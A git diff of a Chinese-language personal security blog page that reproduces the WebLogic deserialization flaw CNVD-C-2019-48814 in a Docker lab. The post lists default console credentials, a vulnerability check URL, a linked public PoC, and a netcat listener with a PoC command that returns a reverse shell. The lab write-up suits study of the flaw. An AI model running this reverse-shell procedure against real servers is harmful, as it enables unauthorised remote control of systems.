@@ -1,4 +1,89 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>CNVD-C-2019-48814 · null</title><meta name="description" content="CNVD-C-2019-48814复现docker搭建环境：123456docker pull ismaleiva90/weblogic12docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:l"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/"></a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"><li><a href="https://twitter.com/www.baidu.com"><i class="fa fa-twitter"></i></a></li><li><a href="http://weibo.com/www.baidu.com"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>CNVD-C-2019-48814</a></h3></div><div class="post-content"><h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest</span><br><span class="line">http://localhost:49163/console</span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></p>
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>CNVD-C-2019-48814 | </title>
+
+  
+  <meta name="author" content="damn1t">
+  
+
+  
+  <meta name="description" content="CNVD-C-2019-48814复现docker搭建环境：123456docker pull ismaleiva90/weblogic12docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:l">
+  
+
+  
+  
+  <meta name="keywords" content="cve">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="CNVD-C-2019-48814"/>
+
+  <meta property="og:site_name" content=""/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/"></a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>CNVD-C-2019-48814</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/05/04/cve/CNVD-C-2019-48814/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-05-04T06:48:38.778Z">
+          2019-05-04
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest</span><br><span class="line">http://localhost:49163/console</span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></p>
 <p>漏洞验证：登入-&gt;<a href="http://xx.xx.xx.xxx:49163/_async/AsyncResponseService" target="_blank" rel="noopener">http://xx.xx.xx.xxx:49163/_async/AsyncResponseService</a><br><img src="https://images.seebug.org/content/images/2019/05/01/1556688743000-3.png-w331s" alt=""><br>若出现如上述页面则可确定漏洞基本存在</p>
 <p>poc：<a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a><br>验证方式：<br>在攻击机开启本地监听，<code>nc -lvvp 2333</code><br>调用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py -l 192.168.10.144 -p 2333 -r http://192.168.10.145:49163</span><br></pre></td></tr></table></figure></p>
 <p>这里似乎如果将监听地址写为<code>127.0.0.1</code>是不行的，只能改为在内网中的地址，拿到shell</p>
@@ -16,4 +101,47 @@
 <p>执行的具体流程：<br><img src="https://images.seebug.org/content/images/2019/05/01/1556688745000-25.png-w331s" alt=""></p>
 <p>分析参考：<br><a href="https://paper.seebug.org/909/#417" target="_blank" rel="noopener">https://paper.seebug.org/909/#417</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725</a><br><a href="http://pupiles.com/xmldecoder.html" target="_blank" rel="noopener">http://pupiles.com/xmldecoder.html</a></p>
 <p>复现参考：<br><a href="https://www.o2oxy.cn/2204.html" target="_blank" rel="noopener">https://www.o2oxy.cn/2204.html</a></p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-05-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/cve/" title="cve">cve </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/05/04/cve/CNVD-C-2019-48814/,null,CNVD-C-2019-48814,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/05/04/vulnerable/padding oracle attack/" title="padding oracle">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/" title="hack the box邀请码获取和web challenge">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/cve/">cve</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 damn1t
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
